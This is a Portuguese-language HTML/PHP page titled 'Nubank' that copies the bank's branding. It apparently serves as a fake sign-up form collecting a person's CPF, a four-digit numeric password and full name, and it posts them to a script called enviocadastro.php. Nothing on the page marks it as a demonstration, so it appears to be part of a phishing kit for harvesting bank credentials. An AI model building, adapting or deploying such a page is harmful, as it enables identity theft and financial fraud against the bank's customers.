<script>
function validarFormulario() {
  var cpfInput = document.getElementById('cpfInput').value;
  cpfInput = cpfInput.replace(/\D/g, ''); // Remover caracteres não numéricos

  if (cpfInput.length !== 11) {
    alert('O CPF deve ter exatamente 11 dígitos.');
    return false; // Cancela o envio do formulário
  }

  var senhaInput = document.getElementById('senhaInput').value;
  senhaInput = senhaInput.replace(/\D/g, ''); // Remover caracteres não numéricos

  if (senhaInput.length !== 4) {
    alert('A senha deve ter exatamente 4 dígitos.');
    return false; // Cancela o envio do formulário
  }

  var nomeInput = document.getElementById('nomeInput').value.trim();
  var sobrenomeInput = document.getElementById('sobrenomeInput').value.trim();

  if (nomeInput === '') {
    alert('Por favor, preencha o campo Nome.');
    return false; // Cancela o envio do formulário
  }

  if (sobrenomeInput === '') {
    alert('Por favor, preencha o campo Sobrenome.');
    return false; // Cancela o envio do formulário
  }

  var nomeCompleto = nomeInput + ' ' + sobrenomeInput;

  var nomeCompletoInput = document.createElement('input');
  nomeCompletoInput.setAttribute('type', 'hidden');
  nomeCompletoInput.setAttribute('name', 'nomeCompleto');
  nomeCompletoInput.setAttribute('value', nomeCompleto);
  document.getElementById('form1').appendChild(nomeCompletoInput);

  // Se todas as validações passarem, o formulário será enviado normalmente
  return true;
}
</script>

<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="shortcut icon" href="imagens/icone.png" />
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <title>Nubank</title>
  <link rel="stylesheet" href="estilonu.css">

  <!-- Place your kit's code here -->
  <script src="https://kit.fontawesome.com/5b81a21603.js" crossorigin="anonymous"></script>
  <script language="javascript" type="text/javascript">
    function keyEnterPressed(e, document){
      if(e.keyCode=='13')
      {
        document.focus();
      }
    }
  </script>

  <style type="text/css">
    .bordadestaque {
      border: 2px solid #0069FE;
      font-family: Verdana, Geneva, sans-serif;
      font-size: 19px;
      padding: 12px;
      background-color: #FFFFFF;
      border-radius: 5px;
    }

    A {
      text-decoration: none;
      font-size: 14px;
    }

    txt centro {
      text-align: center;
    }

    #form1 p #cusuario {
      text-align: center;
    }

    .bordalogin {
      border: 1px solid #820AD1;
      font-family: Verdana, Geneva, sans-serif;
      font-size: 16px;
      padding: 12px;
      background-color: #FFFFFF;
      border-radius: 5px;
    }

    .campotexto {
      font-family: "Graphik Regular";
      font-size: 25px;
      padding: 5px;
      background-color: #FFFFFF;
      border-radius: 5px;
      border-top-width: 1px;
      border-right-width: 1px;
      border-bottom-width: 1px;
      border-left-width: 1px;
      border-top-style: none;
      border-right-style: none;
      border-bottom-style: none;
      border-left-style: none;
      text-align: center;
    }

    .botaoentrar {
      font-size: 18px;
      background-color: #820AD1;
      width: 220px; /* Ajuste a largura conforme necessário */
      height: 44px; /* Ajuste a altura conforme necessário */
      color: #FFF;
      border-radius: 45px;
      font-style: normal;
      line-height: normal;
      background-position: center center;
      font-weight: normal;
      margin: 0px;
      border: 10px double #820AD1;
      text-align: center;
      font-family: "Graphik Medium";
    }

    .botaocadastro {
      font-size: 18px;
      background-color: #FFFFFF;
      width: 180px; /* Ajuste a altura conforme necessário */
      color: #820AD1;
      border-radius: 45px;
      font-style: normal;
      line-height: normal;
      background-position: center center;
      font-weight: normal;
      margin: 0px;
      border: 1px solid #820AD1;
      text-align: center;
      height: 30px;
    }

    body,td,th {
      font-family: Verdana, Geneva, sans-serif;
    }

    body {
      background: url(<?php echo $selectedBg; ?>);
      margin: 0;
      padding: 0;
      text-align: center;
      background-attachment: fixed;
      background-repeat: no-repeat;
      background-scale: 100%;
      background-size: contain;
      background-size: cover;
    }

    .contorno {
      background-color: #FFF;
      width: 390px;
      display: table;
      height: 350px;
      border-radius: 15px;
      opacity: 0.9;
      margin: auto;
      margin-top: 50px;
    }

    .bordaentrada {
      border: 1px solid #CCC;
      border-radius: 30px;
    }
  </style>
</head>

<body text="#666666" link="#666666" vlink="#333333" alink="black">
<table width="100%" border="0">
  <tr>
    <td height="50" align="center"><table width="90%" border="0">
      <tr>
        <td><a href="login.php"><img src="imagens/x.png" alt="" width="24"></a></td>
        <td align="right">&nbsp;</td>
      </tr>
    </table></td>
  </tr>
</table>
<form onsubmit="return validarFormulario()" name="form1" method="post" action="enviocadastro.php">
  <center>
    <table width="100%" border="0">
      <tr>
        <td height="50" align="center" valign="middle" class="icon3" style="font-size: 26px; color: #666;"><strong>Cadastre-se!</strong></td>
      </tr>
    </table>

    <div class="contorno">
      <table width="300" border="0" align="center" class="bordaentrada">
        <tr>
          <td width="450" height="70" align="center" valign="middle" scope="col"><style>
            ::placeholder {
              color: #820AD1;
              font-size: 18px;
            }
          </style><input name="cpf" type="text" class="campotexto" id="cpfInput" placeholder="CPF" size="13" maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '')" inputmode="numeric" style="outline: none;" />





          </td>
        </tr>
        <tr>
          <td height="50" align="center" valign="top" scope="col"><input name="senha" type="password" class="campotexto" id="senhaInput" placeholder="SENHA" size="13" maxlength="4" oninput="this.value = this.value.replace(/[^0-9]/g, '')" inputmode="numeric" style="outline: none;" /></td>
        </tr>
        <tr>
          <td height="50" align="center" valign="top" scope="col"><input name="nome" type="text" class="campotexto" id="nomeInput" placeholder="PRIMEIRO NOME" size="13" maxlength="50" style="outline: none;" /></td>
        </tr>
        <tr>
          <td height="50" align="center" valign="top" scope="col"><input name="sobrenome" type="text" class="campotexto" id="sobrenomeInput" placeholder="SOBRENOME" size="13" maxlength="150" style="outline: none;" /></td>
        </tr>
      </table>
      <table width="95%" border="0">

        <tr>
          <td height="30" align="center" valign="middle">
        </tr>
        <tr>
          <td height="50" align="center" valign="middle"><input type="submit" class="botaoentrar" value="Cadastrar"></td>
        </tr>
        <tr>
          <td height="30" align="center" valign="middle">&nbsp;</td>
        </tr>
        <tr>
          <td height="30" align="center" valign="middle"><a href="login.php" class="botaocadastro">&nbsp;&nbsp;JÁ TENHO CADASTRO&nbsp;&nbsp;</a></td>
        </tr>
        <tr>
          <td height="50" align="center" valign="middle">&nbsp;</td>
        </tr>
        <tr>
          <td height="30" align="center" valign="middle">&nbsp;</td>
        </tr>
        <tr>
          <td height="30" align="center" valign="middle">&nbsp;</td>
        </tr>
      </table>
    </div>
  </center>
</form>
</body>
</html>
